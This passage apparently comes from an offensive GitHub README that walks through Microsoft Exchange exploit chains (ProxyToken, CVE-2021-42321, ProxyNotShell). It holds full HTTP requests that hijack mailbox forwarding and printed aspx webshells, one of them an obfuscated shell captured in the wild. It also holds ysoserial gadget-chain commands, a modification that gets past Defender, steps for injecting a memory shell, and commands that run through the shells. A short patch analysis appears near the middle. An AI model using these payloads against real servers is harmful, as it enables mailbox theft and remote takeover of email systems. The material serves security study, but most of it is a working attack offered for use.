 - ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/proxyshell12.png)

## exploit proxyshell by using one click shell scripts from github

 - [proxyshell-auto](https://github.com/Udyz/proxyshell-auto)
 - [ProxyShell: More Ways for More Shells](https://www.horizon3.ai/proxyshell-more-ways-for-more-shells/)
 - ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/proxyshell13.png)

## Pwn2Own 2021 Microsoft 3rd Exchange Exploit Chain (proxyshell but intresting exploit script)
### links

- [Pwn2Own 2021 Microsoft Exchange Exploit Chain](https://blog.viettelcybersecurity.com/pwn2own-2021-microsoft-exchange-exploit-chain/)
 - [Pwn2Own2021MSExchangeExploit.py](https://gist.github.com/rskvp93/4e353e709c340cb18185f82dbec30e58)

# ProxyToken (completed)
## ProxyToken part links

 - [PROXYTOKEN: AN AUTHENTICATION BYPASS IN MICROSOFT EXCHANGE SERVER](https://www.zerodayinitiative.com/blog/2021/8/30/proxytoken-an-authentication-bypass-in-microsoft-exchange-server)
 - [CVE-2021-33766-ProxyToken](https://github.com/demossl/CVE-2021-33766-ProxyToken)
 - [CVE-2021-33766](https://github.com/bhdresh/CVE-2021-33766)

- Information about the affected exchange versions

``` bash
<= July 2021 Exchange cumulative updates.
```

## Reproducing proxytoken

- Note: this vulnerability can be used for exchange mailbox theft, phishing, social engineering role impersonation and so on. Only the mailbox name is needed, no password at all

### Analysis of the burpsuite request packets

1. First send the request packet below to see whether the proxytoken vulnerability exists, where test@exchange2016.com is the mailbox address whose mail the attacker wants to read

``` bash
GET /ecp/test@exchange2016.com/PersonalSettings/HomePage.aspx?showhelp=false HTTP/1.1
Host: 192.168.186.130
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Cookie: SecurityToken=x
```

The returned response packet has page status 200, and the response header contains "msExchEcpCanary=" with a value, which means the vulnerability exists

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/proxytoken.png)

2. Second, send the request packet below to create a mail forwarding rule to the test@exchange2016.com mailbox. After that, every mail administrator@exchange2016.com sends to the test@exchange2016.com mailbox is also forwarded to the proxymail@exchange2016.com mailbox, which achieves reading of an arbitrary mailbox

``` bash
POST /ecp/test@exchange2016.com/RulesEditor/InboxRules.svc/Newobject?msExchEcpCanary=FrgLJ_16A0Wr_5nhVivj6vBJGbdFFtsIzwQBoOvKIiUzB1yV5wMJqzG8oRfNd1HWUKm33fyrJ-I. HTTP/1.1
Host: 192.168.186.130
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Cookie: SecurityToken=x
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 327


{"properties":{"RedirectTo":[{"RawIdentity":"proxymail@exchange2016.com","DisplayName":"proxymail@exchange2016.com","Address":"proxymail@exchange2016.com","AddressOrigin":0,"galContactGuid":null,"RecipientFlag":0,"RoutingType":"SMTP","SMTPAddress":"proxymail@exchange2016.com"}],"Name":"Testrule","StopProcessingRules":true}}
```

The returned response packet has page status 200 and the response content below, which means the vulnerability exists

``` bash
{"d":{"__type":"RuleRowResults:ECP","Cmdlets":["New-InboxRule"],"ErrorRecords":[],"Informations":[],"IsDDIEnabled":false,"Warnings":[],"Output":null}}
```

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/proxytoken1.png)

### golang proxytoken one click exploit

- [proxytoken.go](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/proxytoken/proxytoken.go)
 - Use Options:

``` bash
-te: is the email that you want to redirect to...
-ve: is the email that you want to attack and read the email ...
```

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/proxytoken2.png)

Result of the change to the mail forwarding rule

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/proxytoken3.png)

Mail sending test: as shown below, every mail administrator@exchange2016.com sends to the test@exchange2016.com mailbox is also forwarded to the proxymail@exchange2016.com mailbox

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/proxytoken4.png)
 - ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/proxytoken5.png)
 - ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/proxytoken6.png)

# Exchange Authenticated RCE CVE-2021-42321 (completed)
## CVE-2021-42321 part links

- [Get started with EWS client applications](https://learn.microsoft.com/en-us/exchange/client-developer/exchange-web-services/get-started-with-ews-client-applications)
 - [Analysis of Microsoft Exchange's November patch](https://blog.khonggianmang.vn/phan-tich-ban-va-thang-11-cua-microsoft-exchange/)
 - [CVE-2021-42321](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42321)
 - [Some notes about Microsoft Exchange Deserialization RCE (CVE-2021–42321)](https://peterjson.medium.com/some-notes-about-microsoft-exchange-deserialization-rce-cve-2021-42321-110d04e8852)
 - [DotNet security - reproducing the CVE-2021-42321 vulnerability](https://mp.weixin.qq.com/s/t6aVu1Nk-1xXcs-ohdBnig)
 - [Exchange vulnerability analysis series part two [Exchange deserialization code execution vulnerability (CVE-2021–42321)]](https://mp.weixin.qq.com/s/V3UIT7xJmV5iJ33-kFAAhQ)
 - [Analysis of the Exchange deserialization vulnerability (part one)](https://mp.weixin.qq.com/s/QSE4trL-AOgvChJ8UTp7OQ)
 - vuln version & patched version go to [How Tanium Can Help with the November 2021 Exchange Vulnerabilities (CVE-2021-42321)](https://community.tanium.com/s/article/How-Tanium-Can-Help-with-the-November-2021-Exchange-Vulnerabilities-CVE-2021-42321)
 - [exch_CVE-2021-42321](https://github.com/7BitsTeam/exch_CVE-2021-42321)
 - [CVE-2021-42321- Tianfu Cup Exchange deserialization vulnerability analysis](https://www.wangan.com/p/7fygf33f38821d6b)
 - [CVE-2021-42321_poc.py](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/exch_CVE-2021-42321/CVE-2021-42321_shell_write_exp.py)

Exchange 2016 CU 21,22 and Exchange 2019 CU 10,11. This means the only recent latest version of Exchange 2016,2019 are vulnerable to this CVE

1. Create UserConfiguration with BinaryData as our Gadget Chain
2. Request to EWS for GetClientAccessToken to trigger the Deserialization

- vulnerable exchange versions

``` bash
Exchange Server 2016 CU22 <= Oct21SU 15.1.2375.12 15.01.2375.012
Exchange Server 2016 CU21 <= Oct21SU 15.1.2308.15 15.01.2308.015
Exchange Server 2019 CU11 <= Oct21SU 15.2.986.9 15.02.0986.009
Exchange Server 2019 CU10 <= Oct21SU 15.2.922.14 15.02.0922.014
```

- Local test exchange environment (Exchange Server 2016 with no security update installed):

| Test status | exchange version | File Name | Publication date | File Size |
| ----------- | ----------- | ----------- | ----------- | ----------- |
| Test succeeded | Exchange Server 2016 Cumulative Update 22 (KB5005333) 15.01.2375.007 | ExchangeServer2016-x64-CU22.ISO | 2021/9/24 | 6.6 GB |
| Test failed | Security Update For Exchange Server 2016 CU22 (KB5008631) 15.01.2375.018 | Exchange2016-KB5008631-x64-zh-hans.msp | 2022/1/11 | 151.2 MB |

## Modifying ysoserial.net directly so that it writes an aspx webshell

The 500 error met during actual exploitation is caused by the fact that, ever since ProxyLogon and ProxyShell and up to now, some edr, AV, sysmon and Microsoft Windows Defender try to catch and block processes spawned from the w3wp.exe process. So the process started by the w3wp process was blocked by Defender.

In that case it is enough to change ysoserial's code so that it writes a file, without starting another process.

The modified [TypeConfuseDelegateGenerator](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/exch_CVE-2021-42321/TypeConfuseDelegateGenerator.cs)

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/TypeConfuseDelegateGenerator.png)

Compared with the original [TypeConfuseDelegateGenerator-origin](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/exch_CVE-2021-42321/TypeConfuseDelegateGenerator-origin.cs)

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/TypeConfuseDelegateGenerator1.png)

``` bash
TypeConfuse链改为写入文件，即可绕过 windows definder 的 w3wp.exe启动进程。
将此文件覆盖ysoserial.net原始文件，重新编译即可。
```

Then run the following command to generate the gadget chain:

``` bash
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -o base64 -c "1" -t
```

Replace the gadget in the original poc and the webshell is written successfully

The original poc was modified, adding gadget chains that write the two kinds of shell below:

- luci.aspx

``` bash
a<script language='JScript' runat='server' Page aspcompat=true>function Page_Load(){eval(Request['cmd'],'unsafe');}</script>
```

- atobshell.aspx

``` bash
a<%@ Page Language=\'JScript\' Debug=\'true\'%><%@Import Namespace=\'System.IO\'%><%File.WriteAllBytes(Request[\'b\'], Convert.FromBase64String(Request[\'a\']));%>
```

- [CVE-2021-42321_shell_write_exp.py](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/exch_CVE-2021-42321/CVE-2021-42321_shell_write_exp.py)

Run the script and both webshells are written successfully, which makes all kinds of later operations easier

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/TypeConfuseDelegateGenerator2.png)

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/TypeConfuseDelegateGenerator3.png)

``` bash
view-source:https://192.168.186.135/aspnet_client/luci.aspx?cmd=Response.Write(new ActiveXObject("WScript.Shell").Exec("cmd.exe /c whoami /all").StdOut.ReadAll());
```

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/TypeConfuseDelegateGenerator4.png)

## Adding a gadget chain that implants a memory shell

change DisableActivitySurrogateSelectorTypeCheck to True to overcome the limitation of .NET and later inject DLL to achieve mem-shell with Jscript to bypass the detection

### .net mem-shell researchs resources

1. First, before injecting the memory shell, DisableActivitySurrogateSelectorTypeCheck has to be changed to True to get around the .NET restriction. Here the gadget chain that combines ClaimsPrincipal + ActivitySurrogateDisableTypeCheck from the official [ysoserial.net](https://github.com/pwntester/ysoserial.net) repository is used

Generate a minified BinaryFormatter payload to exploit Exchange CVE-2021-42321 using the ActivitySurrogateDisableTypeCheck gadget inside the ClaimsPrincipal gadget.

``` bash
.\ysoserial.exe -g ClaimsPrincipal -f BinaryFormatter -c foobar -bgc ActivitySurrogateDisableTypeCheck --minify --ust
```

Add this ClaimsPrincipal+ActivitySurrogateDisableTypeCheck deserialization chain to the [CVE-2021-42321_shell_write_exp.py](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/CVE-2021-42321_shell_write_exp.py) exp script

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/memshell2.png)

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/memshell3.png)

After changing DisableActivitySurrogateSelectorTypeCheck to True to get around the .NET restriction, use the unmodified version of the TypeConfuseDelegate gadget chain that pops a calculator to pop a calculator on the target, in order to confirm that DisableActivitySurrogateSelectorTypeCheck was successfully changed to True

- origin TypeConfuseDelegate chain

``` bash
.\ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -o base64 -c "calc" -t
```

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/memshell13.png)

2. The way the memory shell is generated through deserialization here mainly follows:

- [DotNet memory shell - HttpListener](https://mp.weixin.qq.com/s/zsPPkhCZ8mhiFZ8sAohw6w)
 - [Reworking the .Net memory shell](https://cloud.tencent.com/developer/article/1915652)
 - [Memshell-HttpListener](https://github.com/A-D-Team/SharpMemshell/tree/main/HttpListener)

Compile the .dll file of the memory shell following the instructions in the Memshell-HttpListener github repository

``` bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /r:System.Web.dll,System.dll,Microsoft.CSharp.dll,System.Core.dll /t:library memshell.cs
```

After compiling, a memshell.dll file is produced in the directory. Rename it to e.dll, which is needed later when generating the deserialization chain

- [HttpListener - e.dll](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/HttpListener/e.dll)
 - ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/memshell.png)

Copy the e.dll file into the bin directory of ysoserial.exe

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/memshell1.png)

Now generate the gadget chain combining ClaimsPrincipal + ActivitySurrogateSelector that loads e.dll and injects the memory shell

The flow that loads e.dll in the [ActivitySurrogateSelectorGenerator.cs](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/ysoserial.net-modified/ysoserial/Generators/ActivitySurrogateSelectorGenerator.cs) file

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/memshell4.png)
 - ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/memshell5.png)

and the built-in Disable ActivitySurrogate type protections during generation feature

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/memshell6.png)

``` bash
.\ysoserial.exe -g ClaimsPrincipal -f BinaryFormatter -c foobar -bgc ActivitySurrogateSelector --minify --ust
```

Add this ClaimsPrincipal+ActivitySurrogateSelector deserialization chain to the [CVE-2021-42321_shell_write_exp.py](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/exch_CVE-2021-42321/CVE-2021-42321_shell_write_exp.py) exp script

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/memshell7.png)
 - ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/memshell8.png)

- Testing the final exp locally

1. Before running the exp:

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/memshell9.png)

2. Run the exp script and inject the .net memory shell in one click

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/memshell10.png)

3. Check the command execution effect of the memory shell

``` bash
curl http://192.168.186.135/favicon.ico -H "Type: cmd"  -d "pass=whoami"
```

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/memshell11.png)
 - ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/memshell12.png)

#### note: a separate github repository will be opened later for an in-depth analysis of the principles of .net memory shells and how they are used in practice
 - [Some ways to solve the problem of not being able to getshell with asp.net](https://y4er.com/posts/aspnet-getshell-tips/)
 - [A brief discussion of the DotNET memory shell Filter](https://www.crisprx.top/archives/547)
 - [A brief discussion of the DotNet memory shell Route](https://www.crisprx.top/archives/552)
 - [A brief discussion of the DotNet memory shell HttpListener](https://www.crisprx.top/archives/555)
 - [Memory shells under ASP.NET (1) filter memory shell](https://tttang.com/archive/1408/)
 - [Memory shells under ASP.NET (2) Route memory shell](https://tttang.com/archive/1420/)
 - [Memory shells under ASP.NET (3) HttpListener memory shell](https://tttang.com/archive/1451/)
 - [Memory shells under ASP.NET (4) VirtualPath memory shell](https://tttang.com/archive/1488/)
 - [Penetration technique - hiding an ASP.NET Webshell using virtual files](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8%E8%99%9A%E6%8B%9F%E6%96%87%E4%BB%B6%E9%9A%90%E8%97%8FASP.NET-Webshell)
 - [Analysis of loading a .NET assembly from memory (Assembly.Load)](https://3gstudent.github.io/%E4%BB%8E%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD.NET%E7%A8%8B%E5%BA%8F%E9%9B%86(Assembly.Load)%E7%9A%84%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90)
 - [Analysis of loading a .NET assembly from memory (execute-assembly)](https://3gstudent.github.io/%E4%BB%8E%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD.NET%E7%A8%8B%E5%BA%8F%E9%9B%86(execute-assembly)%E7%9A%84%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90)
 - [Loading a .Net program using JS](https://3gstudent.github.io/%E5%88%A9%E7%94%A8JS%E5%8A%A0%E8%BD%BD.Net%E7%A8%8B%E5%BA%8F)
 - [Loading a PE file in memory through .NET](https://3gstudent.github.io/%E9%80%9A%E8%BF%87.NET%E5%AE%9E%E7%8E%B0%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BDPE%E6%96%87%E4%BB%B6)

### Fix

It is fixed in KB5007409; the place where the final deserialization happens, here

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/repair.png)

this.formatter is the implementation of IClientExtensionCollectionFormatter, and only the following is left

``` bash
Microsoft.Exchange.Data.ApplicationLogic.Extension.ClientExtensionCollectionFormatter.Deserialize(Stream):
    Collection
```

1. The TypeConfuseDelegate chain

(1). When the Formatter's Binder property was initialized, a malicious class was placed in the allowlist, which made the built-in blocklist filtering ineffective.

(2). A class name in the ChainedSerializationBinder blocklist was misspelled, which made the built-in blocklist filtering ineffective.

ClientExtensionCollectionFormatter.Deserialize() was changed to use ExchangeBinaryFormatterFactory.CreateBinaryFormatter() to create the Formatter and then deserialize the data, with its allowedTypes set to empty, instead of using TypedBinaryFormatter directly; the TypedBinaryFormatter class was even deleted outright.

2. The ClaimsPrincipal chain

The developers wrote the class name wrongly: the correct form of System.Security.ClaimsPrincipal should be System.Security.Claims.ClaimsPrincipal, and it was simply changed to the correct class name.

# ProxyRelay (no domain environment available)
## ProxyRelay part links

- [A New Attack Surface on MS Exchange Part 4 - ProxyRelay!](https://blog.orange.tw/2022/10/proxyrelay-a-new-attack-surface-on-ms-exchange-part-4.html)
 - [ProxyRelay](https://github.com/HuanGMZzz/ProxyRelay)

- Information about the exchange versions affected by the vulnerability

``` bash
 <= Exchange Server 2013 CU23
 <= Exchange Server 2016 CU23
 <= Exchange Server 2019 CU12
```

- [Relaying NTLM authentication over RPC](https://blog.compass-security.com/2020/05/relaying-ntlm-authentication-over-rpc/)
 - [Attacking MS Exchange Web Interfaces](https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/)

### Round 1 - Relay to Exchange FrontEnd

### Round 2 - Relay to Exchange BackEnd
#### 2-1 Attacking BackEnd /EWS

#### 2-2 Attacking BackEnd /RPC

#### 2-3 Attacking BackEnd /PowerShell

#### 2-4 Patching BackEnd

### Round 3 - Relay to Windows DCOM
#### Patching DCOM

# ProxyNotShell (completed)
## ProxyNotShell part links

 - [ProxyNotShell — the story of the claimed zero days in Microsoft Exchange](https://doublepulsar.com/proxynotshell-the-story-of-the-claimed-zero-day-in-microsoft-exchange-5c63d963a9e9)
 - [WARNING: NEW ATTACK CAMPAIGN UTILIZED A NEW 0-DAY RCE VULNERABILITY ON MICROSOFT EXCHANGE SERVER](https://gteltsc.vn/blog/warning-new-attack-campaign-utilized-a-new-0day-rce-vulnerability-on-microsoft-exchange-server-12715.html)
 - [ProxyNotShell: CVE-2022-41040 and CVE-2022-41082 Exploits Explained](https://www.picussecurity.com/resource/blog/proxynotshellcve-2022-41040-and-cve-2022-41082-exploits-explained)
 - [Microsoft Exchange ProxyNotShell vulnerability explained and how to mitigate it](https://www.csoonline.com/article/3682762/microsoft-exchange-proxynotshell-vulnerability-explained-and-how-to-mitigate-it.html)
 - [Threat Brief: CVE-2022-41040 and CVE-2022-41082: Microsoft Exchange Server (ProxyNotShell)](https://unit42.paloaltonetworks.com/proxynotshell-cve-2022-41040-cve-2022-41082/)
 - [Analyzing attacks using the Exchange vulnerabilities CVE-2022-41040 and CVE-2022-41082](https://www.microsoft.com/en-us/security/blog/2022/09/30/analyzing-attacks-using-the-exchange-vulnerabilities-cve-2022-41040-and-cve-2022-41082/)

- Information about the exchange versions affected by the vulnerability

``` bash
 <= Microsoft Exchange Server 2013, Exchange Server 2016, and Exchange Server 2019. September 2021 Cumulative Update (CU)
```

## Vulnerability POC exploitation and analysis of the principle

- [CONTROL YOUR TYPES OR GET PWNED: REMOTE CODE EXECUTION IN EXCHANGE POWERSHELL BACKEND](https://www.zerodayinitiative.com/blog/2022/11/14/control-your-types-or-get-pwned-remote-code-execution-in-exchange-powershell-backend)
 - [CVE-2022-41040 and CVE-2022-41082 – zero-days in MS Exchange](https://securelist.com/cve-2022-41040-and-cve-2022-41082-zero-days-in-ms-exchange/108364/)
 - [Research on Proxynotshell deserialization and the CVE-2023-21707 vulnerability](https://xz.aliyun.com/t/12634?accounttraceid=97643b6cad1f48a9bc8b9b3016267889gmyp)
 - [All the Proxy(Not)Shells](https://www.splunk.com/en_us/blog/security/all-the-proxy-not-shells.html)
 - [Analysis of the ProxyNotShell vulnerability](https://blog.caspersun.club/2022/12/19/proxynotshell/proxynotshell/)

## Summary of the details

| ZDI | CVE |
| ----------- | ----------- |
| ZDI-CAN-18802 | CVE-2022-41040 |
| ZDI-CAN-18333 | CVE-2022-41082 |

This exploitation chain is a post-auth RCE (an account and password have to be supplied)

The entry point of this SSRF attack request is the same as in the 2021 ProxyShell vulnerability

- CVE-2022-41040 poc

``` bash
GET /autodiscover/autodiscover.json?@zdi/PowerShell?serializationLevel=Full;ExchClientVer=15.2.922.7;clientApplication=ManagementShell;TargetServer=;PSVersion=5.1.17763.592&Email=autodiscover/autodiscover.json%3F@zdi HTTP/1.1
Host: 192.168.1.10
Authorization: Basic cG9jdXNlcjpwb2NwYXNzd2QK
Connection: close
```

After successfully exploiting the CVE-2022-41040 vulnerability, requests carrying a URI and data with LocalSystem privileges can be sent to any backend service

The second vulnerability in the ProxyNotShell chain is CVE-2022-41082, a remote code execution vulnerability found in the Exchange PowerShell backend. Its CVSS score is 8.8 (high). After bypassing authentication by abusing CVE-2022-41040, the attacker uses CVE-2022-41082 to run arbitrary commands on the vulnerable Exchange server.

The version numbers of these attacked Exchange servers showed that the latest updates were already installed, so exploiting the earlier Proxyshell backend vulnerability was impossible, which confirms that this is a new 0day RCE exploitation chain

In addition, the mitigation that was given is exactly the same as for the 2021 ProxyShell Powershell RCE

Because an attacker using CVE-2022-41040 and CVE-2022-41082 follows the same SSRF->RCE attack flow as the ProxyShell vulnerability but has to authenticate to the Exchange server, Kevin Beaumont named this vulnerability chain ProxyNotShell, after its predecessor.

- The antsword webshell captured in a real attack

``` bash
<%@Page Language="Jscript"%>
<%eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String('NTcyM'+'jk3O3'+'ZhciB'+'zYWZl'+''+'P'+'S'+char(837-763)+System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String('MQ=='))+char(51450/525)+''+''+char(0640-0462)+char(0x8c28/0x1cc)+char(0212100/01250)+System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String('Wg=='))+'m'+''+'UiO2V'+'2YWwo'+'UmVxd'+'WVzdC'+'5JdGV'+'tWydF'+'WjBXS'+'WFtRG'+'Z6bU8'+'xajhk'+'J10sI'+'HNhZm'+'UpOzE'+'3MTY4'+'OTE7'+'')));%>
```

Exploitation of the ProxyShell vulnerability only happened on port 443 (HTTPS), while for ProxyNotShell ports 5985 (HTTP) and 5986 (HTTPS) are also in scope

## ProxyNotShell exploitation details
### step1

An HTTP POST request that uses XML SOAP to start PsRemoting

Web-Based Enterprise Management (WBEM) is accessed through the WSMAN protocol. The attacker starts a shell on the vulnerable system so that PowerShell scripts can be executed further through Windows Remote Management (PsRemoting).

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/proxynotshell5.png)

- request

``` bash
POST /autodiscover/admin@localhost//powershell/autodiscover.json?x=a HTTP/1.1
Host: 192.168.14.6
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
Content-Type: application/soap+xml;charset=UTF-8
Cookie: Email=autodiscover/admin@localhost
Content-Length: 7076
Authorization: NTLM TlRMTVNTUAADAAAAGAAYAHIAAAAmASYBigAAAAAAAABYAAAAGgAaAFgAAAAAAAAAcgAAABAAEACwAQAANYKJ4gYBsR0AAAAPhC4i/YVS+VB0G4hNptNku2EAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdwnLRH74UZh1WHEOmDltNwEBAAAAAAAAZCww0zTi2QHzuBzg/jLiNgAAAAACABgARQBYAEMASABBAE4ARwBFADIAMAAxADYAAQAeAFcASQBOAC0AVQBQAEYAMAA5AFIANwBIADIANgA0AAQAIABlAHgAYwBoAGEAbgBnAGUAMgAwADEANgAuAGMAbwBtAAMAQABXAEkATgAtAFUAUABGADAAOQBSADcASAAyADYANAAuAGUAeABjAGgAYQBuAGcAZQAyADAAMQA2AC4AYwBvAG0ABQAgAGUAeABjAGgAYQBuAGcAZQAyADAAMQA2AC4AYwBvAG0ABwAIAGQsMNM04tkBBgAEAAIAAAAKABAA5zRZWjBRW9TZInuvk2v9vQAAAAAAAAAAhe1lJqMaH9fVr+rLcgUHxA==

<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">
        <s:Header>
                <a:To>https://exchange16.domaincorp.com:443/PowerShell?PSVersion=5.1.19041.610</a:To>
                <w:ResourceURI s:mustUnderstand="true">http://schemas.microsoft.com/powershell/Microsoft.Exchange</w:ResourceURI>
                <a:ReplyTo>
                        <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
                </a:ReplyTo>
                <a:Action s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/transfer/Create</a:Action>
                <w:MaxEnvelopeSize s:mustUnderstand="true">512000</w:MaxEnvelopeSize>
                <a:MessageID>uuid:89d1d533-39ea-4e1f-b566-463e276e9ce8</a:MessageID>
                <w:Locale xml:lang="en-US" s:mustUnderstand="false" />
                <p:DataLocale xml:lang="en-US" s:mustUnderstand="false" />
                <p:SessionId s:mustUnderstand="false">uuid:d5a6b749-9109-4bc7-969a-4223ef795a72</p:SessionId>
                <p:OperationID s:mustUnderstand="false">uuid:381b8e15-dff7-4812-9867-3bc71f9b5ed3</p:OperationID>
                <p:SequenceId s:mustUnderstand="false">1</p:SequenceId>
                <w:OptionSet xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" s:mustUnderstand="true">

                        <w:Option Name="protocolversion" MustComply="true">2.3</w:Option>
                </w:OptionSet>
                <w:OperationTimeout>PT180.000S</w:OperationTimeout>
        </s:Header>
        <s:Body>
                <rsp:Shell xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" Name="WinRM10" >
                        <rsp:InputStreams>stdin pr</rsp:InputStreams>
                        <rsp:OutputStreams>stdout</rsp:OutputStreams>
